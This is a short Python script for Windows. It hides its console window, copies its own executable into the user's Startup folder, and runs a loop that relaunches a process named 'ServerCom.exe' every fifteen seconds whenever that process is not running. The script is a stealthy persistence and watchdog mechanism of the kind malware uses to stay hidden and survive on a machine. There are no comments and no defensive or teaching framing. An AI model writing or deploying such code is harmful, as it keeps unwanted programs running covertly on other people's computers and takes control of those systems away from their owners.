import time
import psutil
import subprocess
import os
import ctypes
import __main__
import shutil

kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
SW_HIDE = 0
hWnd = kernel32.GetConsoleWindow()
user32.ShowWindow(hWnd, SW_HIDE)

name = os.getlogin()
path_ = f"C:\\Users\\{name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\ServerCom.exe"

rpath = f"C:\\Users\\{name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

file_name = __main__.__file__.split("\\")[-1].split(".")[0]+".exe"
file_path = f"{os.getcwd()}\\{file_name}"

if os.path.exists(f"{path_}\\{file_name}"):
    pass
elif not os.path.exists(f"{rpath}\\{file_name}"):
    shutil.copy(file_path, rpath)

while True:
    if "ServerCom.exe" in (i.name() for i in psutil.process_iter()):
        pass
    else:
        subprocess.run(path_)
    time.sleep(15)